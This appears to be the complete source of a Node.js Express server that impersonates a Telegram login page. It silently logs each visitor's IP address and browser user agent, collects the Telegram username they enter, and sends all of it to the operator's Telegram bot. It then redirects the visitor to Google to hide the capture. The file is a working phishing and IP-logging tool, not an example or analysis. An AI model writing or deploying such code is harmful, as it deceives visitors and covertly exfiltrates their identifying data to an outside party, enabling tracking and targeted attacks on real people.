const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TOKEN;
const TELEGRAM_CHAT_ID = process.env.CHAT_ID;

function sendToTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN) return;
  axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: text
  }).catch(e => console.log(e.message));
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const cleanIp = ip.replace('::ffff:', '');
  const ua = req.headers['user-agent'] || 'Unknown';
  const time = new Date().toLocaleString();

  sendToTelegram(`📍 NEW VISIT\n🕒 ${time}\n🌐 IP: ${cleanIp}\n💻 UA: ${ua.slice(0, 100)}`);

  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Telegram</title>
  <style>
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0f0f0f;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;padding:20px}
    .card{background:#1f1f1f;border-radius:28px;padding:32px 24px;max-width:400px;width:100%;text-align:center}
    .logo svg{width:48px;height:48px;fill:#2c7be5}
    h2{font-size:24px;margin-bottom:8px}
    .sub{color:#888;margin-bottom:28px}
    input{width:100%;padding:14px;background:#2a2a2a;border:none;border-radius:14px;color:#fff;margin-bottom:16px}
    button{width:100%;padding:14px;background:#2c7be5;border:none;border-radius:14px;color:#fff;font-weight:600;cursor:pointer}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg></div>
    <h2>Welcome</h2>
    <div class="sub">Enter your Telegram username</div>
    <form action="/submit" method="post">
      <input type="text" name="username" placeholder="@username" required>
      <button type="submit">Continue</button>
    </form>
  </div>
</body>
</html>`);
});

app.post('/submit', (req, res) => {
  const { username } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const cleanIp = ip.replace('::ffff:', '');

  sendToTelegram(`👤 USERNAME\n🌐 IP: ${cleanIp}\n👤 @${username}`);

  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Redirecting...</title></head>
<body style="background:#0f0f0f;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh">
  <div>Redirecting...</div>
  <script>setTimeout(()=>{location.href="https://google.com"},2000)</script>
</body></html>`);
});

app.listen(PORT, () => console.log(`✅ Логер запущен`));
